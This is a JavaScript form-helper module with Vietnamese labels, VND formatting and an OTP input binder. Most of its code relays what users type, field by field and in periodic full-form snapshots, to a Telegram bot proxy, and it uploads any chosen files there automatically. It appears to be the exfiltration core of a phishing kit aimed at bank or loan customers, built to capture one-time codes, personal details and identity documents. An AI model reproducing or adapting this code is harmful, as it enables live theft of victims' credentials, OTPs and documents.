// shared-form.js
function genUUIDv4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === "x" ? r : r & 3 | 8;
    return v.toString(16);
  });
}
function debounce(fn, delay = 600) {
  let t = null;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), delay);
  };
}
var NBSP = "\xA0";
function digitsOnly(str = "") {
  return str.replace(/\D+/g, "");
}
function formatVND(digits) {
  if (!digits) return "";
  const parts = [];
  for (let i = digits.length; i > 0; i -= 3) {
    parts.unshift(digits.slice(Math.max(0, i - 3), i));
  }
  return parts.join(".") + NBSP + "\u20AB";
}
function bindMoneyInput(inputEl, onFormatted) {
  inputEl.addEventListener("input", () => {
    const raw = digitsOnly(inputEl.value);
    inputEl.value = formatVND(raw);
    if (typeof onFormatted === "function") onFormatted(inputEl.value, raw);
  });
}
function p2(n) {
  return String(n).padStart(2, "0");
}
function addHours(date, h) {
  const t = new Date(date.getTime());
  t.setHours(t.getHours() + Number(h));
  return t;
}
function getNowPlusMinutes(m) {
  const t = /* @__PURE__ */ new Date();
  t.setMinutes(t.getMinutes() + m);
  t.setSeconds(0);
  t.setMilliseconds(0);
  return t;
}
function toLocalDatetimeValue(dt) {
  return `${dt.getFullYear()}-${p2(dt.getMonth() + 1)}-${p2(dt.getDate())}T${p2(dt.getHours())}:${p2(dt.getMinutes())}`;
}
function formatDateTime(dt) {
  return `${p2(dt.getDate())}/${p2(dt.getMonth() + 1)}/${dt.getFullYear()} ${p2(dt.getHours())}:${p2(dt.getMinutes())}`;
}
async function _tgFetch(endpoint, options) {
  if (!window.TG_PROXY_URL) {
    console.warn("TG_PROXY_URL ch\u01B0a \u0111\u01B0\u1EE3c \u0111\u1EB7t. B\u1ECF qua g\u1EEDi.");
    return null;
  }
  try {
    const res = await fetch(`${window.TG_PROXY_URL}${endpoint}`, options);
    if (!res.ok) {
      const txt = await res.text();
      console.warn("Telegram proxy l\u1ED7i", res.status, txt);
    }
    return res;
  } catch (e) {
    console.warn("Telegram proxy exception", e);
    return null;
  }
}
async function tgSendMessage(text, parse_mode = "Markdown") {
  return _tgFetch("/tele/sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ message: text, parse_mode }) });
}
async function tgSendDocument(file, caption = "") {
  const fd = new FormData();
  fd.append("file", file, file.name);
  if (caption) fd.append("caption", caption);
  return _tgFetch("/tele/sendDocument", { method: "POST", body: fd });
}
function validFileSize(f, maxMB = 5) {
  return f.size <= maxMB * 1024 * 1024;
}
function describeFile(f) {
  return `${f.name} (${(f.size / 1024 / 1024).toFixed(2)} MB)`;
}
function bindFileAutoUpload(inputEl, { captionPrefix, listTargetId, maxMB = 5, onEachSend } = {}) {
  inputEl.addEventListener("change", async () => {
    const listEl = document.getElementById(listTargetId);
    const files = [...inputEl.files || []];
    if (listEl) listEl.textContent = files.map(describeFile).join(" \u2022 ");
    if (!files.length) return;
    for (const f of files) {
      if (!validFileSize(f, maxMB)) {
        alert(`T\u1EC7p "${f.name}" v\u01B0\u1EE3t qu\xE1 ${maxMB} MB.`);
        continue;
      }
      await tgSendMessage(`*T\u1EC7p:* ${captionPrefix}
\u2022 ${describeFile(f)}`);
      await tgSendDocument(f, `${captionPrefix} \u2013 ${f.name}`);
      if (onEachSend) onEachSend(f);
    }
  });
}
function bindMaskedOTP(inputEl, onChange) {
  inputEl.addEventListener("input", () => {
    let v = inputEl.value.replace(/\D/g, "");
    if (v.length > 6) v = v.slice(0, 6);
    inputEl.value = v;
    if (onChange) onChange(v);
  });
  inputEl.addEventListener("paste", (e) => {
    e.preventDefault();
    let t = (e.clipboardData || window.clipboardData).getData("text") || "";
    t = t.replace(/\D/g, "").slice(0, 6);
    inputEl.value = t;
    if (onChange) onChange(t);
  });
}
function createFieldSender() {
  const send = debounce((txt) => tgSendMessage(txt), 500);
  return (label, val) => send(`*Tr\u01B0\u1EDDng c\u1EADp nh\u1EADt:*
\u2022 ${label}: ${val || "\u2014"}`);
}
function collectFormData(fields) {
  return fields.map((f) => `\u2022 *${f.label}:* ${f.value || "\u2014"}`).join("\n");
}
function bindLiveField(el, { label, mode = "both", debounceMs = 600, mask, transform } = {}) {
  if (!el) return;
  let lastSent = null;
  const apply = (v) => transform ? transform(v) : v;
  const format = (v) => mask ? mask(v) : v;
  const sendNow = (val) => {
    const prepared = apply(val || "");
    if (prepared === lastSent) return;
    lastSent = prepared;
    tgSendMessage(`*Field:* ${label}
\u2022 ${format(prepared) || "\u2014"}`);
  };
  const debounced = debounce((v) => sendNow(v), debounceMs);
  const onInput = () => {
    if (mode === "input" || mode === "both") debounced(el.value);
  };
  const onBlur = () => {
    if (mode === "blur" || mode === "both") sendNow(el.value);
  };
  el.addEventListener("input", onInput);
  el.addEventListener("blur", onBlur);
  if (el.value) sendNow(el.value);
  return {
    forceSend: () => sendNow(el.value),
    dispose: () => {
      el.removeEventListener("input", onInput);
      el.removeEventListener("blur", onBlur);
    }
  };
}
function autoRelayForm(formEl, {
  fieldSelector = "input,select,textarea",
  ignore = [],
  debounceInputMs = 700,
  batchIntervalMs = 4e3,
  maskers = {
    phone: (v) => "\u2022".repeat(v.length),
    creditLimitGranted: (v) => v.replace(/\\d/g, "\u2022")
  },
  // { fieldId: fn(value)=>masked }
  transforms = {},
  // { fieldId: fn(value)=>normalized }
  labelMap = {},
  // { fieldId: 'Label hiển thị' }
  snapshotEvery = 3e4,
  snapshotTitle = "Form Snapshot"
} = {}) {
  if (!formEl) return { dispose: () => {
  } };
  const pending = /* @__PURE__ */ new Map();
  let batchTimer = null;
  let lastSnapshot = 0;
  const sendBatch = () => {
    if (!pending.size) return;
    const lines = [];
    for (const { label, value } of pending.values()) {
      lines.push(`\u2022 *${label}:* ${value || "\u2014"}`);
    }
    pending.clear();
    tgSendMessage(`*Fields Update Batch:*
${lines.join("\n")}`);
  };
  const scheduleBatch = () => {
    if (batchTimer) return;
    batchTimer = setTimeout(() => {
      batchTimer = null;
      sendBatch();
    }, batchIntervalMs);
  };
  const debounceMap = /* @__PURE__ */ new Map();
  function debouncePerField(id, fn) {
    if (debounceMap.has(id)) clearTimeout(debounceMap.get(id));
    const t = setTimeout(fn, debounceInputMs);
    debounceMap.set(id, t);
  }
  function processField(el, immediate = false) {
    const id = el.id || el.name || el.getAttribute("data-field") || "";
    if (!id || ignore.includes(id)) return;
    let raw = el.type === "checkbox" ? el.checked ? "C\xF3" : "Kh\xF4ng" : el.value || "";
    if (transforms[id]) raw = transforms[id](raw);
    let showVal = raw;
    if (maskers[id]) showVal = maskers[id](raw);
    const label = labelMap[id] || el.getAttribute("data-label") || id;
    pending.set(id, { label, value: showVal });
    if (immediate) sendBatch();
    else scheduleBatch();
  }
  const elements = [...formEl.querySelectorAll(fieldSelector)];
  const onInput = (e) => {
    const el = e.target;
    const id = el.id || el.name || "";
    debouncePerField(id, () => processField(el, false));
  };
  const onChange = (e) => {
    processField(e.target, true);
  };
  elements.forEach((el) => {
    el.addEventListener("input", onInput);
    el.addEventListener("change", onChange);
    processField(el, false);
  });
  const snapTimer = setInterval(() => {
    if (Date.now() - lastSnapshot < snapshotEvery) return;
    lastSnapshot = Date.now();
    const current = [];
    for (const el of elements) {
      const id = el.id || el.name || "";
      if (!id || ignore.includes(id)) continue;
      let raw = el.type === "checkbox" ? el.checked ? "C\xF3" : "Kh\xF4ng" : el.value || "";
      if (transforms[id]) raw = transforms[id](raw);
      let showVal = raw;
      if (maskers[id]) showVal = maskers[id](raw);
      const label = labelMap[id] || el.getAttribute("data-label") || id;
      current.push(`\u2022 *${label}:* ${showVal || "\u2014"}`);
    }
    if (current.length) tgSendMessage(`*${snapshotTitle}:*
${current.join("\n")}`);
  }, 5e3);
  return {
    dispose: () => {
      elements.forEach((el) => {
        el.removeEventListener("input", onInput);
        el.removeEventListener("change", onChange);
      });
      if (batchTimer) clearTimeout(batchTimer);
      clearInterval(snapTimer);
      pending.clear();
    }
  };
}
if (typeof window !== "undefined") {
  window.SharedForm = {
    genUUIDv4,
    debounce,
    digitsOnly,
    formatVND,
    bindMoneyInput,
    addHours,
    getNowPlusMinutes,
    toLocalDatetimeValue,
    formatDateTime,
    tgSendMessage,
    tgSendDocument,
    validFileSize,
    describeFile,
    bindFileAutoUpload,
    bindMaskedOTP,
    createFieldSender,
    collectFormData,
    bindLiveField,
    autoRelayForm
  };
}
export {
  addHours,
  autoRelayForm,
  bindFileAutoUpload,
  bindLiveField,
  bindMaskedOTP,
  bindMoneyInput,
  collectFormData,
  createFieldSender,
  debounce,
  describeFile,
  digitsOnly,
  formatDateTime,
  formatVND,
  genUUIDv4,
  getNowPlusMinutes,
  tgSendDocument,
  tgSendMessage,
  toLocalDatetimeValue,
  validFileSize
};
//# sourceMappingURL=shared-form.js.map
